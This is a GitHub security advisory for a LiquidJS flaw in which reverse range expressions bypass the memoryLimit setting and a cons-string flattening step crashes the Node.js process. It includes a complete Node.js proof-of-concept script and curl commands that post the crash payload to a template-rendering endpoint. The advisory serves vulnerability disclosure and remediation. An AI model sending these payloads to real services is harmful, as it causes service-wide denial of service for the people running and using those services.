# [H] LiquidJS: memoryLimit Bypass through Negative Range Values Leads to Process Crash

## Summary
Severity: High
Advisory: GHSA-9r5m-9576-7f6x
CVE: CVE-2026-33285
CWE: CWE-20, CWE-400
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-03-25
Source: https://github.com/advisories/GHSA-9r5m-9576-7f6x
Type: github-advisory

## Affected
- npm: `liquidjs` — affected >=0

## Details
### Summary

LiquidJS's `memoryLimit` security mechanism can be completely bypassed by using reverse range expressions (e.g., `(100000000..1)`), allowing an attacker to allocate unlimited memory. Combined with a string flattening operation (e.g., `replace` filter), this causes a **V8 Fatal error that crashes the Node.js process**, resulting in complete denial of service from a single HTTP request.

### Details
When LiquidJS evaluates a range token `(low..high)`, it calls `ctx.memoryLimit.use(high - low + 1)` in `src/render/expression.ts:70` to account for memory usage. However, for reverse ranges where `low > high` (e.g., `(100000000..1)`), this computation yields a negative value (`1 - 100000000 + 1 = -99999998`).

The `Limiter.use()` method in `src/util/limiter.ts:11-14` does not validate that the `count` parameter is non-negative. It simply adds `count` to `this.base`, causing the internal counter to go negative. Once the counter is sufficiently negative, subsequent legitimate memory allocations that would normally exceed the configured `memoryLimit` pass the `base + count <= limit` assertion.

```typescript
// src/render/expression.ts:67-72
function * evalRangeToken (token: RangeToken, ctx: Context) {
  const low: number = yield evalToken(token.lhs, ctx)
  const high: number = yield evalToken(token.rhs, ctx)
  ctx.memoryLimit.use(high - low + 1)  // high=1, low=1e8 → use(-99999999)
  return range(+low, +high + 1)
}

// src/util/limiter.ts:11-14
use (count: number) {
  count = +count || 0
  assert(this.base + count <= this.limit, this.message)
  this.base += count  // base becomes negative
}
```

#### Escalation to Process Crash via Cons-String Flattening

V8 optimizes string concatenation (`append` filter) by creating a cons-string (a linked tree of string fragments) rather than copying data. This means `{% assign s = s | append: s %}` repeated 27 times creates a 134MB logical string that consumes only kilobytes of actual memory.

However, when a filter that requires the full string buffer is applied — such as `replace` — V8 must "flatten" the cons-string into a contiguous memory buffer. For a 134MB cons-string, this requires allocating ~268MB (UTF-16) in a single operation. This triggers a **V8 C++ level Fatal error** (`Fatal JavaScript invalid size error 134217729`) that:

- **Cannot be caught** by JavaScript `try-catch` or `process.on('uncaughtException')`
- **Immediately terminates** the Node.js process (exit code 133 / SIGTRAP)
- **Crashes the entire service**, not just the attacking connection

The complete attack chain:
1. Insert 5 reverse ranges `{% for x in (100000000..1) %}{% endfor %}` → memory budget becomes -500M
2. Build a 134MB cons-string via 27 iterations of `{% assign s = s | append: s %}`  → negligible actual memory
3. Apply `{% assign flat = s | replace: 'A', 'B' %}` → V8 attempts to flatten → **Fatal error → process crash**

The attacker payload is ~400 bytes. The server process dies instantly. Express error handlers, domain handlers, and uncaughtException handlers are all bypassed.

### PoC
- LiquidJS <= 10.24.x with `memoryLimit` option enabled
- Attacker can control Liquid template source code 


Save the following as `poc_memorylimit_bypass.js` and run with `node poc_memorylimit_bypass.js`:

```javascript
const { Liquid } = require('liquidjs');

(async () => {
  const engine = new Liquid({ memoryLimit: 1e8 }); // 100MB limit

  // Step 1 — Baseline: memoryLimit blocks large allocation
  console.log('=== Step 1: Baseline (should fail) ===');
  try {
    const baseline = "{% assign s = 'A' %}{% for i in (1..27) %}{% assign s = s | append: s %}{% endfor %}{{ s | size }}";
    const result = await engine.parseAndRender(baseline);
    console.log('Result:', result); // Should not reach here
  } catch (e) {
    console.log('Blocked:', e.message); // "memory alloc limit exceeded"
  }

  // Step 2 — Bypass: reverse ranges drive counter negative
  console.log('\n=== Step 2: Bypass (should succeed) ===');
  try {
    const bypass = "{% for x in (100000000..1) %}{% endfor %}{% for x in (100000000..1) %}{% endfor %}{% assign s = 'A' %}{% for i in (1..27) %}{% assign s = s | append: s %}{% endfor %}{{ s | size }}";
    const result = await engine.parseAndRender(bypass);
    console.log('Result:', result); // "134217728" — 134MB allocated despite 100MB limit
  } catch (e) {
    console.log('Error:', e.message);
  }

  // Step 3 — Process crash: cons-string flattening via replace
  console.log('\n=== Step 3: Process crash (node process will terminate) ===');
  console.log('If the process exits here with code 133/SIGTRAP, the crash is confirmed.');
  try {
    const crash = [
      ...Array(5).fill('{% for x in (100000000..1) %}{% endfor %}'),
      "{% assign s = 'A' %}{% for i in (1..27) %}{% assign s = s | append: s %}{% endfor %}",
      "{% assign flat = s | replace: 'A', 'B' %}{{ flat | size }}"
    ].join('');
    const result = await engine.parseAndRender(crash);
    console.log('Result:', result); // Should not reach here
  } catch (e) {
    console.log('Caught error:', e.message); // V8 Fatal error is NOT catchable
  }
})();
```

**Expected output:**

```
=== Step 1: Baseline (should fail) ===
Blocked: memory alloc limit exceeded, line:1, col:43

=== Step 2: Bypass (should succeed) ===
Result: 134217728

=== Step 3: Process crash (node process will terminate) ===
If the process exits here with code 133/SIGTRAP, the crash is confirmed.
#
# Fatal error in , line 0
# Fatal JavaScript invalid size error 134217729
#
```

The process terminates at Step 3 with exit code 133 (SIGTRAP). The V8 Fatal error occurs at the C++ level and **cannot be caught** by `try-catch`, `process.on('uncaughtException')`, or any JavaScript error handler.

#### HTTP Reproduction (for applications that accept user templates)

If the application exposes an endpoint that renders user-supplied Liquid templates with `memoryLimit` configured (e.g., CMS preview, newsletter editor, etc.):

```bash
# Step 1 — Baseline: should return "memory alloc limit exceeded"
curl -s -X POST http://<app>/render \
  -H "Content-Type: application/json" \
  -d '{"template": "{% assign s = '\''A'\'' %}{% for i in (1..27) %}{% assign s = s | append: s %}{% endfor %}{{ s | size }}"}'

# Step 2 — Bypass: should return "134217728" (134MB allocated despite 100MB limit)
curl -s -X POST http://<app>/render \
  -H "Content-Type: application/json" \
  -d '{"template": "{% for x in (100000000..1) %}{% endfor %}{% for x in (100000000..1) %}{% endfor %}{% assign s = '\''A'\'' %}{% for i in (1..27) %}{% assign s = s | append: s %}{% endfor %}{{ s | size }}"}'

# Step 3 — Process crash: connection drops, server process terminates
curl -s -X POST http://<app>/render \
  -H "Content-Type: application/json" \
  -d '{"template": "{% for x in (100000000..1) %}{% endfor %}{% for x in (100000000..1) %}{% endfor %}{% for x in (100000000..1) %}{% endfor %}{% for x in (100000000..1) %}{% endfor %}{% for x in (100000000..1) %}{% endfor %}{% assign s = '\''A'\'' %}{% for i in (1..27) %}{% assign s = s | append: s %}{% endfor %}{% assign flat = s | replace: '\''A'\'', '\''B'\'' %}{{ flat | size }}"}'
```

Replace `http://<app>/render` with the actual template rendering endpoint. The payload is pure Liquid syntax and works regardless of the HTTP framework or endpoint structure.

### Impact
An attacker who can control template content (common in CMS, email template editors, and SaaS platforms using LiquidJS) can bypass the `memoryLimit` protection entirely and crash the Node.js process:

- **Complete bypass of the `memoryLimit` security mechanism**: The explicitly configured memory limit becomes ineffective.
- **Process crash from a single HTTP request**: V8 Fatal error terminates the entire Node.js process, not just the attacking request. This is not a catchable JavaScript exception.
- **Service-wide denial of service**: All in-flight requests are terminated. Manual restart or container restart policy is required to recover.
- **False sense of security**: Administrators who configured `memoryLimit` believe their service is protected when it is not.
- **Container restart policy does not mitigate**: Even with Docker `restart: always` or Kubernetes liveness probes, repeated crash payloads can keep the service in a perpetual restart loop. Each restart takes several seconds, during which all in-flight requests are lost and the service is unavailable.

## References
- https://github.com/harttle/liquidjs/security/advisories/GHSA-9r5m-9576-7f6x
- https://nvd.nist.gov/vuln/detail/CVE-2026-33285
- https://github.com/harttle/liquidjs/commit/95ddefc056a11a44d9e753fd47a39db2c241e578
- https://github.com/harttle/liquidjs
